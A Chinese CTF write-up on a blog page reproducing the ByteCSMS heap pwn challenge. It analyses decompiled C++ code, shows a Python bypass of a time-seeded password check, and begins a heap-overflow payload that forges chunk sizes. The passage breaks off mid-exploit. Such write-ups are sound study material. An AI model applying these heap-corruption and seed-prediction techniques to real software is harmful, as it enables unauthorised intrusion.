<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/10/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/10/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/11/cpp%20pwn+vector%20%E7%BB%93%E6%9E%84%E4%BD%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/11/cpp%20pwn+vector%20%E7%BB%93%E6%9E%84%E4%BD%93/" class="post-title-link" itemprop="url">cpp pwn+vector 结构体</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-11 18:29:32 / Modified: 18:31:48" itemprop="dateCreated datePublished" datetime="2022-09-11T18:29:32+08:00">2022-09-11</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ByteCSMS 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=efcddcc85d4f186d9f52eb73565b577adb87609f, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>代码分析</strong></p>
<p>先说简单的 <code>upload</code> 和 <code>download</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">upload</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// r12</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = get_offset8(a1);                         <span class="comment">// a = *(b+8)</span></span><br><span class="line">  v2 = get_offset0(a1);                         <span class="comment">// a = *b</span></span><br><span class="line">  v3 = get_offset8(vector_state);               <span class="comment">// a = *(b+8)</span></span><br><span class="line">  become3(v5, &amp;v3);                             <span class="comment">// *a = *b</span></span><br><span class="line">  change_vector(vector_state, v5[<span class="number">0</span>], v2, v1);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Upload successfully!&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前面这几个函数的底层逻辑都写上去了（IDA 对于 cpp 的分析结果很差）</li>
<li>upload：的作用就是把 vector_state 管理的 vector 加上现在程序管理的 vector </li>
<li>download：的作用就是把 vector_state 管理的 vector 加到程序管理的 vector 中</li>
</ul>
<p>申请模块 <code>add</code> 中使用了 vector 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">add</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 a2[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_2458(a2);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++chunk_num;</span><br><span class="line">    sub_256A(a1, a2);</span><br><span class="line">    input_name_scores(a1);                      <span class="comment">// 分别输入&#x27;name&#x27;和&#x27;score&#x27;</span></span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter 1 to add another, enter the other to return&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( input() == <span class="number">1</span> );                       <span class="comment">// 输入&#x27;1&#x27;则循环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">input_name_scores</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 name; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 score; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *chunk; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  name = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the ctfer&#x27;s name:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(name, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v2 = sub_24D4(a1, chunk_num - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v2);<span class="comment">// 输入&#x27;name&#x27;</span></span><br><span class="line">  score = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the ctfer&#x27;s scores&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(score, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  chunk = sub_24D4(a1, chunk_num - <span class="number">1</span>);</span><br><span class="line">  chunk[<span class="number">3</span>] = input();                           <span class="comment">// 输入&#x27;score&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>直接看 cpp 的反编译有点难看，于是我们直接进行调试：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">16</span>,<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/64bx <span class="number">0x55e5076c4ea0</span>+<span class="number">16</span></span><br><span class="line"><span class="number">0x55e5076c4eb0</span>:	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span></span><br><span class="line"><span class="number">0x55e5076c4eb8</span>:	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x31</span>	<span class="number">0x64</span>	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>输入 “name” 时没有限制长度，可以无限溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the new name:&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(name, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v10 = sub_24D4(a1, index);</span><br><span class="line"><span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v10);</span><br><span class="line">score = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter the new score:&quot;</span>);</span><br><span class="line"><span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(score, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">chunk = sub_24D4(a1, index);</span><br><span class="line">chunk[<span class="number">3</span>] = input();</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>edit</code> 中输入 “name” 时也有同样的漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>要想进入菜单，需要先通过一个加密算法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">19</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = j | key[j] ^ <span class="number">0xF</span>;</span><br><span class="line">  code[j] = rand() &amp; v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个算法需要随机数，种子是从系统时间中获取的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seed = time(<span class="number">0LL</span>);</span><br><span class="line">srand(seed);</span><br></pre></td></tr></table></figure>
<ul>
<li>一般这种从系统时间中获取的随机数，都可以通过以下脚本破解：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>C语言中，time 这里的种子是秒级的，那么我们可以在写 exp 的时候也同时启动一个 time 的种子，获取同样的随机数</li>
<li>绕过脚本如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">libcc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">v0 = libcc.time(<span class="number">0</span>)</span><br><span class="line">libcc.srand(v0)</span><br><span class="line">key = <span class="string">&quot;n0_One_kn0w5_th15_passwd&quot;</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    v1 = i | <span class="built_in">ord</span>(key[i]) ^ <span class="number">0xF</span></span><br><span class="line">    password += <span class="built_in">chr</span>(libcc.rand() &amp; v1)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Password for admin:&quot;</span>, password)</span><br></pre></td></tr></table></figure>
<p>有堆溢出，但程序的堆分配很奇怪，直接分析反汇编有点困难，所以我们直接输出测试数据找规律</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">upload()</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="string">&quot;4&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">download()</span><br><span class="line">add(<span class="string">&quot;5&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br><span class="line">add(<span class="string">&quot;6&quot;</span>*<span class="number">12</span>,<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223ea0</span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223ec0</span></span><br><span class="line"><span class="function">Size: 0x31</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223ef0 <span class="comment">/* upload */</span></span></span><br><span class="line"><span class="function">Size: 0x31</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223f20</span></span><br><span class="line"><span class="function">Size: 0x51</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x564bdd223f70 </span></span><br><span class="line"><span class="function">Size: 0x91</span></span><br></pre></td></tr></table></figure>
<ul>
<li>堆只能从小到大进行申请，大小依次为“0x20”，“0x30”，“0x50”，“0x90”，“0x100”……</li>
<li>当一个 chunk 写满后，程序就会把原来的 chunk 释放，申请一个更大的 chunk，并把之前所有的数据复制进新的 chunk 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x564bdd223f70</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x564bdd223f70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x564bdd223f78</span> ◂— <span class="number">0x91</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x564bdd223f80</span> ◂— <span class="string">&#x27;111111111111d&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x564bdd223f88</span> ◂— <span class="number">0x6431313131</span> <span class="comment">/* &#x27;1111d&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x564bdd223f90</span> ◂— <span class="string">&#x27;222222222222d&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x564bdd223f98</span> ◂— <span class="number">0x6432323232</span> <span class="comment">/* &#x27;2222d&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x564bdd223fa0</span> ◂— <span class="string">&#x27;333333333333d&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x564bdd223fa8</span> ◂— <span class="number">0x6433333333</span> <span class="comment">/* &#x27;3333d&#x27; */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x564bdd223fb0</span> ◂— <span class="string">&#x27;444444444444d&#x27;</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x564bdd223fb8</span> ◂— <span class="number">0x6434343434</span> <span class="comment">/* &#x27;4444d&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x564bdd223fc0</span> ◂— <span class="string">&#x27;111111111111d&#x27;</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x564bdd223fc8</span> ◂— <span class="number">0x6431313131</span> <span class="comment">/* &#x27;1111d&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x564bdd223fd0</span> ◂— <span class="string">&#x27;222222222222d&#x27;</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x564bdd223fd8</span> ◂— <span class="number">0x6432323232</span> <span class="comment">/* &#x27;2222d&#x27; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x564bdd223fe0</span> ◂— <span class="string">&#x27;555555555555d&#x27;</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x564bdd223fe8</span> ◂— <span class="number">0x6435353535</span> <span class="comment">/* &#x27;5555d&#x27; */</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x564bdd223ff0</span> ◂— <span class="string">&#x27;666666666666d&#x27;</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x564bdd223ff8</span> ◂— <span class="number">0x6436363636</span> <span class="comment">/* &#x27;6666d&#x27; */</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x564bdd224000</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>upload</code> 会保存当前数组的“状态”，并单独写入一个 chunk 中</li>
<li><code>download</code> 会把 <code>upload</code> 保存的 chunk 添加到当前数组的末尾，再写入堆中（如果写不下就新创建一个更大的 chunk，并把原来的 chunk 释放掉）</li>
</ul>
<p>现在了解该程序的分配规则了，首先要解决的就是堆风水的问题，限制如下：</p>
<ul>
<li>堆排列从小到大，并且不能重复申请</li>
<li>只能释放前面的 chunk，修改不了 free chunk</li>
<li>输入“score”会截断“name”，可能会破坏我们的 payload</li>
</ul>
<p>程序唯一的突破点就是 <code>upload</code>，因为它可以在可控 chunk 的后面格外写一个 chunk，这样就可以利用 <code>edit</code> 的堆溢出伪造 chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">12</span>, <span class="number">100</span>)</span><br><span class="line">upload()</span><br><span class="line">payload =  <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;b&quot;</span> * <span class="number">0x8</span> + p64(<span class="number">0x501</span>)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0x11e1</span>)</span><br><span class="line">payload += <span class="number">0x4d0</span> * <span class="string">&quot;\x00&quot;</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload,-<span class="number">1</span>)</span><br><span class="line">upload() <span class="comment"># 为了释放之前位置的upload 